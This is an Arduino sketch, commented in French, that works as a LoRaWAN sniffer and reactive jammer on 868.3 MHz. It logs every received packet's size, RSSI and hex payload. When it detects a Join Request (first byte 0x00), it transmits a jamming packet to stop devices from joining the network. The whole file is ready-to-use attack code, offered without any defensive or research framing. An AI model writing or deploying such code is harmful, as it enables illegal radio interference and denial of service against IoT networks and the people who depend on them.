#include <SPI.h>
#include <LoRa.h>

void setup() {
  Serial.begin(9600);
  while (!Serial);

  Serial.println("LoRaWAN Sniffer & Jamming");

  if (!LoRa.begin(868.3E6)) {  // Adapter la fréquence si nécessaire
    Serial.println("Erreur lors de l'initialisation de LoRa !");
    while (1);
  }

  // Configurer les paramètres LoRaWAN
  LoRa.setSpreadingFactor(7);    // SF7
  LoRa.setSignalBandwidth(125E3); // 125 kHz
  LoRa.setCodingRate4(5);        // Coding Rate 4/5

  Serial.println("Sniffer prêt, en attente de paquets...");
}

void loop() {
  int packetSize = LoRa.parsePacket();
  if (packetSize) {
    Serial.println("\nPaquet reçu");

    // Afficher la taille et RSSI
    Serial.print("Taille : ");
    Serial.println(packetSize);
    Serial.print("RSSI : ");
    Serial.println(LoRa.packetRssi());

    // Lire et afficher les données brutes
    uint8_t data[255];
    size_t index = 0;

    Serial.print("Données reçues (hex) : ");
    while (LoRa.available()) {
      uint8_t byte = LoRa.read();
      data[index++] = byte;
      Serial.print(byte < 16 ? "0" : "");
      Serial.print(byte, HEX);
      Serial.print(" ");
    }
    Serial.println();

    // Vérifier si c'est un Join Request (MHDR = 0x00)
    if (index > 0 && data[0] == 0x00) {
      Serial.println("Join Request détectée, activation du brouillage...");

      // Envoi d'un message de brouillage
      LoRa.beginPacket();
      LoRa.print("JammingJammingJammingJammingJammingJammingJammingJamming");
      LoRa.endPacket();

      Serial.println("Brouillage envoyé");
    }
  }
}
